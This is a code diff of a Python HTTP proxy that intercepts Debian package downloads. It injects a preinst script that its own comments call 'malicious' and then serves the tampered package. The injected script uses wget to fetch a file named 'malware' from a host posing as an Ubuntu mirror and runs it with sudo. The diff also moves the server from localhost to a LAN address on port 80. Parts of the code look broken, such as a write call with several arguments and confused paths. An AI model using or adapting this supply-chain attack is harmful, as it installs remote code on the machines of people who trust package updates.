@@ -18,27 +18,42 @@ class Server(BaseHTTPRequestHandler):
                 self.send_header(header, r.headers[header])
             self.end_headers()
 
-            package = self.path.split("/").[-1]
-            #print(r.content)
-            #print(hashlib.sha512(r.content).hexdigest())
-            os.system("ar x {}.deb --output extracting_area".format(package)) #extract deb files 
-            os.system("gunzip {}/control.tar.gzip".format(package)) #unzip control
+            package = self.path.split("/")[-1]
+
+            # extract deb files
+            os.system("ar x {} --output extracting_area".format(package))
+
+            # unzip control
+            os.system("gunzip {}/control.tar.gzip".format(package))
             os.system("tar x {}/control.tar".format(package))
-            if(os.path.exists("{}/control.tar/preinst".format(package)) == False): #checks whether preinst exists already
-                os.system("tar rf {}/control.tar preinst".format(package)) #add malicious preinst
-            else: # if preinst already exists copy created preinst into the exisiting one
+
+            # checks whether preinst exists already
+            if(os.path.exists("{}/control.tar/preinst".format(package)) == False):
+                # add malicious preinst
+                os.system("tar rf {}/control.tar preinst".format(package))
+            # if preinst already exists copy created preinst into the exisiting one
+            else:
                 w_preinst = open("preinst", "w")
-                w_preinst.write("#!/bin/sh \n", "echo "DOWNLOAD" \n", "wget nl.archive.ubuntu.com/malware \n", "./malware \n", "sudo ./malware \n")
-                w_preinst.close() 
-            os.system("gzip {}/control.tar.gzip".format(package)) #zip control
-            os.system("ar r ./test/control.tar.gz {}.deb".format(package)) #add control back to the deb
+                w_preinst.write(
+                        "#!/bin/sh \n",
+                        "echo \"DOWNLOAD\" \n",
+                        "wget nl.archive.ubuntu.com/malware \n",
+                        "./malware \n",
+                        "sudo ./malware \n")
+                w_preinst.close()
+
+            # zip control
+            os.system("gzip {}/control.tar.gzip".format(package))
+
+            # add control back to the deb
+            os.system("ar r ./test/control.tar.gz {}.deb".format(package))
+
             f = open("{}.deb".format(package), "rb")
             content = f.read()
-            #print(content)
-            self.wfile.write(content) #if python 3 - bytes(content)
-            f.close()
 
-            #self.wfile.write(r.content)
+            # if python 3 - bytes(content)
+            self.wfile.write(content)
+            f.close()
         else:
             self.send_response(200)
             self.end_headers()
@@ -49,8 +64,11 @@ class Server(BaseHTTPRequestHandler):
             f.close()
 
 if __name__ == "__main__":
-    web_server = HTTPServer(("localhost", 8080), Server)
-    print("Server started")
+    ip = "192.168.192.11"
+    port = 80
+
+    web_server = HTTPServer((ip, port), Server)
+    print("Server started at {}:{}".format(ip, port))
 
     try:
         web_server.serve_forever()
